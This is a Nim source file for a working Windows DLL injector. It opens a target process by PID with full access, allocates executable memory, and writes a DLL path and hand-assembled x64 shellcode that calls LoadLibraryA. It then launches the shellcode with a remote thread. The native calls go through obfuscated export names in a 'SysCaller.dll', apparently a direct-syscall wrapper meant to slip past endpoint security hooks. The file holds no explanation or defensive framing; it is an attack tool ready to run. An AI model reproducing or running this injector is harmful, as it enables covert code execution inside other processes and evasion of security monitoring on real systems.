import winim/lean, os, strutils, dynlib

type
  NTSTATUS = int32
  SIZE_T = uint64
  ULONG = uint32

# Function pointer types
type
  oznbvo_655212Proc = proc(
    processHandle: HANDLE,
    baseAddress: ptr pointer,
    regionSize: ptr SIZE_T,
    allocationType: ULONG,
    protect: ULONG,
    extendedParams: pointer,
    paramCount: ULONG
  ): NTSTATUS {.stdcall.}

  yexedj_555900Proc = proc(
    processHandle: HANDLE,
    baseAddress: pointer,
    buffer: pointer,
    bufferSize: SIZE_T,
    bytesWritten: ptr SIZE_T
  ): NTSTATUS {.stdcall.}

  jljtug_682236Proc = proc(
    threadHandle: ptr HANDLE,
    desiredAccess: ULONG,
    objectAttributes: pointer,
    processHandle: HANDLE,
    startRoutine: pointer,
    argument: pointer,
    createFlags: ULONG,
    zeroBits: SIZE_T,
    stackSize: SIZE_T,
    maxStackSize: SIZE_T,
    attributeList: pointer
  ): NTSTATUS {.stdcall.}

  ezhgwv_592746Proc = proc(handle: HANDLE): NTSTATUS {.stdcall.}

proc ntSuccess(status: NTSTATUS): bool =
  status >= 0

proc injectDLL(
  processHandle: HANDLE,
  dllPath: string,
  oznbvo_655212: oznbvo_655212Proc,
  yexedj_555900: yexedj_555900Proc,
  jljtug_682236: jljtug_682236Proc,
  ezhgwv_592746: ezhgwv_592746Proc
): bool =
  let absPath = dllPath.absolutePath
  let dllPathBytes = absPath & '\0'
  let pathSize = dllPathBytes.len
  var baseAddress: pointer = nil
  var regionSize: SIZE_T = SIZE_T(pathSize)
  var status = oznbvo_655212(
    processHandle,
    addr baseAddress,
    addr regionSize,
    0x3000, # MEM_COMMIT | MEM_RESERVE
    0x40,   # PAGE_EXECUTE_READWRITE
    nil,
    0
  )
  if not ntSuccess(status):
    echo "[!] Failed to allocate memory for DLL path. Status: 0x", status.toHex
    return false
  echo "[+] Allocated DLL path memory at: 0x", cast[uint64](baseAddress).toHex
  var bytesWritten: SIZE_T = 0
  status = yexedj_555900(
    processHandle,
    baseAddress,
    cast[pointer](dllPathBytes.cstring),
    pathSize.SIZE_T,
    addr bytesWritten
  )
  if not ntSuccess(status) or bytesWritten != pathSize.SIZE_T:
    echo "[!] Failed to write DLL path. Status: 0x", status.toHex, ", Bytes written: ", bytesWritten
    return false
  echo "[+] Successfully wrote DLL path to memory"
  # Get LoadLibraryA address
  let hKernel32 = GetModuleHandleA("kernel32.dll")
  if hKernel32 == 0:
    echo "[!] Failed to get kernel32.dll handle"
    return false
  let loadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA")
  if loadLibraryA == nil:
    echo "[!] Failed to get LoadLibraryA address"
    return false
  echo "[+] LoadLibraryA address: 0x", cast[uint64](loadLibraryA).toHex
  # Build x64 shellcode
  var shellcode: seq[byte] = @[
    0x48'u8, 0x83, 0xEC, 0x28,             # sub rsp, 0x28
    0x48, 0xB9                            # mov rcx,
  ]
  shellcode.add(cast[array[8, byte]](cast[uint64](baseAddress)))
  shellcode.add(@[0x48'u8, 0xB8])         # mov rax,
  shellcode.add(cast[array[8, byte]](cast[uint64](loadLibraryA)))
  shellcode.add(@[
    0xFF'u8, 0xD0,                        # call rax
    0x48, 0x83, 0xC4, 0x28,               # add rsp, 0x28
    0xC3                                  # ret
  ])
  let shellcodeSize = shellcode.len
  var shellcodeAddr: pointer = nil
  regionSize = shellcodeSize.SIZE_T
  status = oznbvo_655212(
    processHandle,
    addr shellcodeAddr,
    addr regionSize,
    0x3000,
    0x40,
    nil,
    0
  )
  if not ntSuccess(status):
    echo "[!] Failed to allocate memory for shellcode. Status: 0x", status.toHex
    return false
  echo "[+] Allocated shellcode memory at: 0x", cast[uint64](shellcodeAddr).toHex
  bytesWritten = 0
  status = yexedj_555900(
    processHandle,
    shellcodeAddr,
    unsafeAddr shellcode[0],
    shellcodeSize.SIZE_T,
    addr bytesWritten
  )
  if not ntSuccess(status) or bytesWritten != shellcodeSize.SIZE_T:
    echo "[!] Failed to write shellcode. Status: 0x", status.toHex, ", Bytes written: ", bytesWritten
    return false
  echo "[+] Successfully wrote shellcode"
  var threadHandle: HANDLE = 0
  status = jljtug_682236(
    addr threadHandle,
    0x1FFFFF, # THREAD_ALL_ACCESS
    nil,
    processHandle,
    shellcodeAddr,
    nil,
    0, 0, 0, 0,
    nil
  )
  if not ntSuccess(status) or threadHandle == 0:
    echo "[!] Failed to create remote thread. Status: 0x", status.toHex, ", Handle: 0x", threadHandle
    return false
  echo "[+] Created remote thread: 0x", threadHandle
  discard WaitForSingleObject(threadHandle, 5000)
  discard ezhgwv_592746(threadHandle)
  echo "[+] Successfully injected ", dllPath, "!"
  return true

when isMainModule:
  if paramCount() != 2:
    echo "Usage: ", paramStr(0), " <pid> <dll_path>"
    quit(1)
  let pid = paramStr(1).parseInt.uint32
  let dllPath = paramStr(2)
  let PROCESS_ALL_ACCESS = 0x1F0FFF'u32
  let hSysCaller = loadLib("SysCaller.dll")
  if hSysCaller == nil:
    echo "[!] Failed to load SysCaller.dll"
    quit(1)
  let oznbvo_655212 = cast[oznbvo_655212Proc](hSysCaller.symAddr("oznbvo_655212"))
  let yexedj_555900 = cast[yexedj_555900Proc](hSysCaller.symAddr("yexedj_555900"))
  let jljtug_682236 = cast[jljtug_682236Proc](hSysCaller.symAddr("jljtug_682236"))
  let ezhgwv_592746 = cast[ezhgwv_592746Proc](hSysCaller.symAddr("ezhgwv_592746"))
  if oznbvo_655212 == nil or yexedj_555900 == nil or jljtug_682236 == nil or ezhgwv_592746 == nil:
    echo "[!] Failed to resolve SysCaller functions"
    quit(1)
  let hProcess = OpenProcess(DWORD(PROCESS_ALL_ACCESS), WINBOOL(0), DWORD(pid))
  if hProcess == 0:
    echo "[!] Failed to open process ", pid
    quit(1)
  discard injectDLL(hProcess, dllPath, oznbvo_655212, yexedj_555900, jljtug_682236, ezhgwv_592746)
  discard CloseHandle(hProcess)